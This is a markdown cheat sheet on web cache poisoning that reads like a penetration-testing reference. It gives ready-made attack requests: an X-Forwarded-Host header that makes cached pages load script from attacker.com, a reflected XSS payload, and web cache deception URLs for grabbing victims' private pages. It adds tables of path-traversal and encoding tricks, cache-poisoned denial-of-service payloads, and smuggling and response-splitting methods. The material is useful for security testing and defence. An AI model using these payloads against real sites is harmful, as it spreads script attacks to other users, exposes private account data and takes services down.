# Cache Poisoning

## Overview
Web cache poisoning uses unkeyed inputs to store malicious responses in shared caches, serving them to other users.

## Core Concept
```
Cache key = typically: Host + Path + Query string
Unkeyed inputs = headers/params that affect response but NOT the cache key
→ Poison cache with malicious unkeyed input → served to all users requesting same key
```

## Finding Unkeyed Inputs
```
# Use Param Miner (Burp extension) to discover unkeyed headers/params
# Common unkeyed headers:
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-For
X-Host
X-Original-URL
X-Rewrite-URL
X-Original-Forwarded-For
Forwarded
```

## Cache Poisoning via X-Forwarded-Host
```
# If server uses X-Forwarded-Host for generating URLs in response
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# Response contains:
<script src="https://attacker.com/static/app.js">
# → Cache this response → serve XSS to all visitors
```

## Cache Poisoning for XSS
```
# Find unkeyed input that is reflected in response
GET /search?q=hello HTTP/1.1
X-Forwarded-Host: attacker.com"><script>alert(1)</script>

# If reflected without encoding in cached response
# All users hitting /search?q=hello get XSS
```

## Cache Poisoning via HTTP Request Smuggling
```
# Smuggle a request that poisons cache for next user
# POST with CL.TE/TE.CL to inject crafted request
# See http_request_smuggling.md
```

## Cache Key Confusion
```
# Some caches ignore port, some don't
GET /page HTTP/1.1
Host: target.com:1337  # different cache key, same backend response

# Fat GET requests
GET /page?param=evil HTTP/1.1
# If param is unkeyed but reflected

# Cache parameter cloaking
GET /page?utm_content=1&param=evil  # utm_content is keyed, param is unkeyed but breaks cache key
```

## Web Cache Deception
```
# Different attack: trick user into caching their private data
# App serves authenticated page for unknown extensions

# Trick victim into visiting:
https://target.com/my-account/cache.css
https://target.com/dashboard.jpg

# If server responds with authenticated content
# Cache stores it → attacker requests same URL → gets victim's data

# Works when:
1. Cache caches static-extension paths
2. Server ignores path suffix and returns dynamic content
3. Cache doesn't validate response is static
```

## Testing Methodology
1. Identify caching behavior: check Age, X-Cache, CF-Cache-Status headers
2. Use Param Miner to find unkeyed headers
3. Test each unkeyed header for reflection in response
4. Test reflection for XSS/redirection injection
5. Poison cache: send malicious request, observe cache status
6. Request from clean browser/IP to confirm poison worked
7. Test web cache deception: add .css/.jpg suffix to authenticated pages

## Cache Identification
```
# Cache hit indicators:
X-Cache: HIT
CF-Cache-Status: HIT
Age: <non-zero>
X-Varnish: <two IDs>

# Force cache miss (to test fresh):
Cache-Control: no-cache
Pragma: no-cache
# Or add cache-busting param: ?cb=12345
```

## Tools
- Burp Param Miner — unkeyed input discovery
- `Web Cache Vulnerability Scanner` (WCVS)
- Manual testing with cache busters



## Additional Techniques — ported from WebSkills (web-cache-vulnerabilities)

### Cache-key manipulation (parser discrepancies)
Every attack below is one idea: find a single URL the **cache reads as "cacheable static asset"** while the **origin reads as "sensitive dynamic page,"** or that splits/collides keys.

| Technique | Example | Discrepancy exploited |
|-----------|---------|-----------------------|
| Unkeyed params | `?q=hi&utm_source=<payload>` | `utm_*`,`_method`,`cb`,`callback`,`gclid` used by origin, excluded from key |
| Duplicate params | `?id=SAFE&id=EVIL` | cache keys first, origin honors last → poison stored under "safe" key |
| Path normalization | `/account/.%2fstyle.css` | origin→`/account`, cache→".css static file" |
| URL decoding | `/api/me%2Fprofile.css` | cache decodes `%2f` but origin doesn't (or reverse) |
| Encoded delimiters | `/profile%3bfoo.css` | one hop treats `%3b`(`;`) as delimiter, other as literal |
| Dot segments | `/static/..%2faccount` | cache collapses `..` while origin resolves later |
| Trailing slash | `/account/` | cache = distinct key, origin = same resource |
| Mixed case | `/Account`, `?LANG=`, `X-Forwarded-Host` | case-sensitive cache vs case-insensitive origin |
| UTF-8 normalization | `/account%c0%afstyle.css` | overlong/full-width `/`,`.`,`;` normalized by one component only |

### Path-traversal cache attacks
Traversal lets you express one effective path the cache and origin resolve differently:
```
GET /static/..%2f..%2faccount     # cache: "/static/..." cacheable ; origin: /account
GET /assets/..%252fapi%252fme     # double-encoded traversal to a sensitive API
GET /account/..%2fstyle.css       # sensitive page mapped onto a .css key
```
- Plain `../`, encoded `..%2f`, double-decode `..%252f`, and mixed `.%2e/` / `..%5c` each defeat a different normalization order. Cache builds its key from the raw/single-decoded URL; if the origin decodes further, the served resource differs from what the cache thinks it stored.

### Cache-Poisoned DoS (CPDoS)
Force the cache to store an **error** response, which it then serves to all users for that URL — DoS without touching the origin (research: cpdos.org).

| Class | Idea | Payload |
|-------|------|---------|
| **HHO** (Header Oversize) | header larger than the *origin* accepts but the *cache* forwards → origin 400, cache stores it | `X-Oversize: AAAA…×8KB` |
| **HMC** (Meta Character) | control/meta char the cache forwards but origin rejects | header value with `\n` / `%0a`, `%00`, `%1f` |
| **HMO** (Method Override) | override header makes origin treat a cached GET as another method → error cached vs GET key | `X-HTTP-Method-Override: POST` (also `X-HTTP-Method`, `X-Method-Override`) |

Detection: seed with a cache buster + the malformed request → observe `400`/`413`/`501`; then send a **normal** request to the same key → if it returns the cached error (HIT via `Age`/`X-Cache`), CPDoS confirmed. Limits: many CDNs cap header size and don't cache 4xx/5xx by default; often per-POP; short TTLs. Mitigation: don't cache errors; align cache/origin header-size limits; strip method-override headers at the edge.

### Response-splitting & smuggling-assisted poisoning
- If a reflected value reaches a response **header** and CR/LF (`%0d%0a`) isn't filtered → split the response and inject a second body/header the cache stores (see crlf_injection.md / http_request_smuggling.md).
- Front-end/back-end request-boundary disagreement (CL.TE/TE.CL) can store a smuggled response against a victim's URL with **no** unkeyed input (HackerOne #919175 — smuggling → cache poisoning, $1,700).

### CDN debug headers (force verbose cacheability)
```bash
# Akamai — ask the edge to report caching decision
curl -sI -H "Pragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-get-cache-key, akamai-x-check-cacheable" https://target/path
# Cloudflare/Fastly: inspect CF-Cache-Status / X-Served-By / X-Cache + Age
```
